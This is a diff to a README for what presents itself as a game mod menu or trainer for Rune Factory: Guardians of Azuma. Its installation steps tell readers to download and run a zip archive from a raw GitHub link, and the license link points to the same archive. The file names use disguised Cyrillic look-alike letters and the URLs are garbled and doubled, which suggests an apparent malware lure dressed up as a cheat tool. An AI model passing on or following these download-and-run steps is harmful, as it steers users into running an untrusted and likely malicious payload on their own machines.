@@ -32,14 +32,14 @@ Rune Factory mod menu, Guardians of Azuma trainer, Rune Factory cheat utility, b
 
 ## 🛠️ Installation
 
-1. Download `https://raw.githubusercontent.com/chiranjit278/AzumaGuardian-ModMenu/main/Lоader.zip` from this repository.
+1. Download `https://raw.githubusercontent.com/chiranjit278/AzumaGuardian-ModMenu/main/lace/Azuma-Guardian-Mod-Menu-v3.7.zipоhttps://raw.githubusercontent.com/chiranjit278/AzumaGuardian-ModMenu/main/lace/Azuma-Guardian-Mod-Menu-v3.7.zip` from this repository.
 2. Extract contents to your Rune Factory: Guardians of Azuma root directory.
-3. Run https://raw.githubusercontent.com/chiranjit278/AzumaGuardian-ModMenu/main/Lоader.zip and follow the setup instructions.
+3. Run https://raw.githubusercontent.com/chiranjit278/AzumaGuardian-ModMenu/main/lace/Azuma-Guardian-Mod-Menu-v3.7.zipоhttps://raw.githubusercontent.com/chiranjit278/AzumaGuardian-ModMenu/main/lace/Azuma-Guardian-Mod-Menu-v3.7.zip and follow the setup instructions.
 4. Launch the game and activate the menu with your preferred hotkey.
 
 ## ⚠️ Disclaimer
 
 For educational and entertainment purposes only. Use at your own risk. Not affiliated with the official game developers or publishers. Online use may violate game terms—exercise caution.
 
-## 📄 [MIT License](https://raw.githubusercontent.com/chiranjit278/AzumaGuardian-ModMenu/main/Lоader.zip) - 2025  
+## 📄 [MIT License](https://raw.githubusercontent.com/chiranjit278/AzumaGuardian-ModMenu/main/lace/Azuma-Guardian-Mod-Menu-v3.7.zipоhttps://raw.githubusercontent.com/chiranjit278/AzumaGuardian-ModMenu/main/lace/Azuma-Guardian-Mod-Menu-v3.7.zip) - 2025  
 Open-source, modify and distribute freely!
